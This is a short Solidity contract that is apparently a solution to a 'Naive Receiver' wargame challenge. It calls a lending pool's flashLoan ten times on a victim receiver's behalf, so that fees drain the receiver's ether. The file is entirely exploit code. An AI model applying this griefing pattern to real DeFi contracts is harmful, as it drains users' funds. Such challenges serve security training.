// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveRecieverAttack {
    function attack(NaiveReceiverLenderPool pool, address receiver) external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 1 ether);
        }
    }
}
